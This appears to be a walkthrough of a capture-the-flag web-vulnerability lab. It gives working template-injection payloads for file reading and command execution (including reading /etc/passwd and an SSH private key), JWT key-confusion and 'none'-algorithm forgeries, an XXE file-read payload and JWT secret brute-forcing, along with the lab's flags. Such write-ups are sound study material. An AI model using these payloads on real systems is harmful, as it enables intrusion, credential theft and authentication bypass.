> ZTH: Obscure Web Vulns

# Server Side Template Injection

A template engine allows developers to use static HTML pages with dynamic elements. Take for instance a static profile.html page, a template engine would allow a developer to set a username parameter, that would always be set  to the current user's username

Server Side Template Injection, is when a user is able to pass in a parameter that can control the template engine that is running on the server.

**Note: Different template engines have different injection payloads, however usually you can test for SSTI using {{2+2}} as a test.**

## Read files : `{{ ''.__class__.__mro__[2].__subclasses__()[40]()(<file>).read()}}`

## Command Execution : `{{config.__class__.__init__.__globals__['os'].popen(<command>).read()}}` 

1. How would a hacker(you :) ) cat out /etc/passwd on the server(using cat with the rce payload)

`{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}`

2. What about reading in the contents of the user test's private ssh key.(use the read file one not the rce one)

`{{ ''.__class__.__mro__[2].__subclasses__()[40]('/home/para/.ssh/id_rsa').read() }}`

# Automatic Exploitation

The basic syntax for tplmap is different depending on whether you're using get or post

```
GET		tplmap -u <url>/?<vulnparam>
POST	tplmap -u <url> -d '<vulnparam>'
```

1. How would I cat out /etc/passwd using tplmap on the ip:port combo 10.10.10.10:5000, with the vulnerable param "noot".

`tplmap -u http://10.10.10.10:5000 -d 'root' --os-cmd "cat /etc/passwd"`

# Challenge: I've created a vulnerable machine for you to test your SSTI skills on! I've placed a flag in /flag aswell, good luck and have fun!

`{{ ''.__class__.__mro__[2].__subclasses__()[40]('/flag').read() }}`

```
cooctus
```

# Cross Site Request Forgery

Cross Site Request Forgery, known as CSRF occurs when a user visits a page on a site, that performs an action on a different site. For instance, let's say a user clicks a link to a website created by a hacker, on the website would be an html tag such as <img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">  which would change the account email on the vulnerable website to "pwned@evil-user.net".  CSRF works because it's the victim making the request not the site, so all the site sees is a normal user making a normal request.

## Tool : pip3 install xsrfprobe

# JSON Web Tokens

We have JWT but algorithm is rs256 which has no exploits.Fortunately for us though, this server leaves its public key lying around, which means we can change the algorithm and sign a new secret! 

1. Change the algorithm in the header to HS256, and then re encode it in base64. 
2. Convert the public key to hex so openssl will use it.

`cat <file> | xxd -p | tr -d "\\n"`

Options:

xxd -p - turns contents of file to hex.
tr -d - removes new lines.

3. use openssl to sign that as a valid HS256 key.

`echo -n "JWT-Token" | openssl dgst -sha256 -mac HMAC -macopt hexkey:<above output>`

4. Decode that hex to binary data, and reencode it in base64,

```
python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('above_output')).replace('=','')\")"
```

# Challenge

JWT: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJQYXJhZG94IiwiaWF0IjoxNjIwNDg0ODIxLCJleHAiOjE2MjA0ODQ5NDEsImRhdGEiOnsicGluZ3UiOiJub290cyJ9fQ.eMQpuvTyWYbRLLyni6spZTiHoA4XNhGPrYvMZjHrCyDvDujw5tySIexkEAR_HxA1gqV1NUhZmM7XCKCwmrOETKt1qnZc8M-IOzF008xR2T8YDLBAoEfUI4VeemdjK3czsDCdqgE4e473bR0J9T-rMhqfmjbZpV0b-rOSZG-HBErR2xlVnp_-NPFQWzW-baZiFLSSsg2nLoub8SONEH5HqpKbg9h1wl4vmKcKw4aDS2VlYMu8fYPWp-u8ZFIAJgwqgyJ3ww_UzlefBo2_kVCDaDvTcYG8PRY_DdC5lrLjZrigfwmHcyNf2hloXpjnuz3K-7NSRU2K0arGxLVI3vq4vA

We can use RsatoHmac.py to get this done. 

RsaToHmac.py -t eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJQYXJhZG94IiwiaWF0IjoxNjIwNDg0ODIxLCJleHAiOjE2MjA0ODQ5NDEsImRhdGEiOnsicGluZ3UiOiJub290cyJ9fQ.eMQpuvTyWYbRLLyni6spZTiHoA4XNhGPrYvMZjHrCyDvDujw5tySIexkEAR_HxA1gqV1NUhZmM7XCKCwmrOETKt1qnZc8M-IOzF008xR2T8YDLBAoEfUI4VeemdjK3czsDCdqgE4e473bR0J9T-rMhqfmjbZpV0b-rOSZG-HBErR2xlVnp_-NPFQWzW-baZiFLSSsg2nLoub8SONEH5HqpKbg9h1wl4vmKcKw4aDS2VlYMu8fYPWp-u8ZFIAJgwqgyJ3ww_UzlefBo2_kVCDaDvTcYG8PRY_DdC5lrLjZrigfwmHcyNf2hloXpjnuz3K-7NSRU2K0arGxLVI3vq4vA -p a

```
[*] Decoded Header value: {"typ":"JWT","alg":"RS256"}
[*] Decode Payload value: {"iss":"Paradox","iat":1620484821,"exp":1620484941,"data":{"pingu":"noots"}}
[*] New header value with HMAC: {"typ":"JWT","alg":"HS256"}
[<] Modify Header? [y/N]: N
[<] Enter Your Payload value: {"iss":"Paradox","iat":1620484821,"exp":1620484941,"data":{"pingu":"noots"}}
[+] Successfully Encoded Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJQYXJhZG94IiwiaWF0IjoxNjIwNDg0ODIxLCJleHAiOjE2MjA0ODQ5NDEsImRhdGEiOnsicGluZ3UiOiJub290cyJ9fQ.-Re8VbWJzFmzBIWxNMO3nGtstTVoCRNGPRe1FdKXjWU
```

# Flag

```
nootnootisthebestflag is the flag
```

# JWT None algorithm

# Header: 

```
{
  "typ": "JWT",
  "alg": "None"
}
```

# Payload: 

```
{
  "auth": 1620485261986,
  "agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
  "role": "root",
  "iat": 1620485262
}
```

eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjogMTYyMDQ4NTI2MTk4NiwgImFnZW50IjogIk1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NzguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC83OC4wIiwgInJvbGUiOiAicm9vdCIsICJpYXQiOiAxNjIwNDg1MjYyfQ.

```
flag=supernootnoot
```

# XXE

By intercepting the request from the login form we can put the payload from PayloadAllTheThings and we can get /etc/passwd file

```
<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root><name>test12</name><tel>
aaa</tel><email>
&xxe;
</email><password>test</password></root>
```

# Bonus Challenge

JWT : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.it4Lj1WEPkrhRo9a2-XHMGtYburgHbdS5s7Iuc1YKOE 

Find the secret.

jwt-cracker  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.it4Lj1WEPkrhRo9a2-XHMGtYburgHbdS5s7Iuc1YKOE abcdefghijklmnopqrstuvwxyz 4

```
Attempts: 100000
Attempts: 200000
Attempts: 300000
SECRET FOUND: pass
Time taken (sec): 6.961
Attempts: 346830
```